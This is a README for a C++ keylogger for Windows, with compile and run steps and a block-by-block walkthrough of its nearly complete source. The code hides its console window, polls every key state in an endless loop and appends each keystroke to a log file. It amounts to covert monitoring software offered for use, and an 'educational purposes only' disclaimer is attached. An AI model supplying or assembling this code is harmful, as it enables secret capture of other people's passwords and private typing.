# Keylogger

This Keylogger is a simple C++ program that records keystrokes and saves them into a log file. It is designed for educational purposes only.

## Requirements

- Windows operating system
- C++ compiler

## Usage
1. Clone the repository or create a new C++ project.
2. Create a new C+++ file (e.g., `keylogger.cpp`) and copy the code into it or clone the repository.
3. Compile the program. 
    ```bash
        g++ keylogger.cpp -o keylogger.exe
    ```
4. Run the program.
5. The program will start recording keystrokes and save them into a log file.

## How It Works

    ```cpp 
    #define _WIN32_WINNT 0x0500
    #include <Windows.h>
    #include <string>
    #include <iostream>
    #include <fstream>
    #include <algorithm>
    ```
- The `#define _WIN32_WINNT 0x0500` directive sets the minimum required version of the Windows API.
- The `Windows.h` header provides functions and constants for Windows programming.
- Other headers `(string, iostream, fstream, algorithm)` are included for various standard C++ functionalities used in the code.

    ```
    #define LOG_FILE "logs.txt"
    ```
- The `LOG_FILE` constant defines the name of the log file where keystrokes will be stored.

    ```cpp
        void saveData(const std::string& data) {
        std::ofstream logFile(LOG_FILE, std::ios::app);

        if (logFile.is_open()) {
            logFile << data;
            logFile.close();
        }
    }
    ```
- The `saveData` function takes a string `(data)` as input and appends it to the log file specified by `LOG_FILE`.
- It uses an `ofstream` object `(logFile)` to open the file in append mode `(std::ios::app)`.
- If the file is successfully opened, the `data` string is written to the file, and then the file is closed.

    ```cpp
        std::string translateSpecialKey(int key) {
        std::string result;

        switch (key) {
        case VK_SPACE:
            result = " ";
            break;
        case VK_RETURN:
            result = "\n";
            break;
        // other cases omitted for brevity
        }

        return result;
    }
    ```
- The `translateSpecialKey` function takes an integer `key` as input and returns a corresponding string representation for special keys.
- It uses a `switch` statement to map the integer `key` to its corresponding special key string.
-- For example, `VK_SPACE` is mapped to a space character, `VK_RETURN` is mapped to a newline character, and so on.

    ```cpp
    int main() {
    int specialKeyArray[] = { VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_CAPITAL, VK_TAB, VK_CONTROL, VK_MENU };
    bool isSpecialKey;

    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    ```
- The `main` function is the entry point of the program.
- An integer array `specialKeyArray` is defined, which contains the virtual key codes for various special keys.
- A boolean variable `isSpecialKey` is declared to determine if a pressed key is a special key.
- The `hwnd` variable holds the handle of the console window, and `ShowWindow` is called to hide the console window.

    ```cpp
            while (true) {
            for (int key = 8; key <= 190; key++) {
                if (GetAsyncKeyState(key) == -32767) {
                    isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);
                    if (isSpecialKey) {
                        std::string specialKeyChar = translateSpecialKey(key);
                        saveData(specialKeyChar);
                    } else {
                        char character = static_cast<char>(key);
                        if (GetKeyState(VK_CAPITAL) & 0x0001) {
                            saveData(std::string(1, character));
                        } else {
                            saveData(std::string(1, std::tolower(character)));
                        }
                    }
                }
            }
        }

        return 0;
    }
    ```
- The program enters an infinite `while` loop to continuously monitor keystrokes.
- The loop iterates over a range of key codes from 8 to 190 (inclusive) using the for loop.
- Inside the loop, `GetAsyncKeyState` is called to check the state of each key.
- If a key is pressed `(GetAsyncKeyState(key) == -32767)`, it is checked if it is a special key using `std::find` and the `specialKeyArray`.
- If it is a special key, the corresponding special character string is retrieved using `translateSpecialKey` and then passed to `saveData` to be saved in the log file.
- If it is not a special key, the key is treated as a regular character.
    - If the Caps Lock key is active `(GetKeyState(VK_CAPITAL) & 0x0001)`, the character is saved in uppercase.
    - Otherwise, the character is converted to lowercase using `std::tolower` and then saved.
- This process continues indefinitely, capturing and logging keystrokes until the program is manually terminated.

## Disclaimer

This software is created solely for educational purposes. The developer is not responsible for any misuse of this software. Please use it responsibly and in compliance with applicable laws and regulations.

---

**Disclaimer of Legal Liability:**
Please refer to the [Disclaimer of Legal Liability](./DISCLAIMER.md) for important legal information regarding the use of this software.
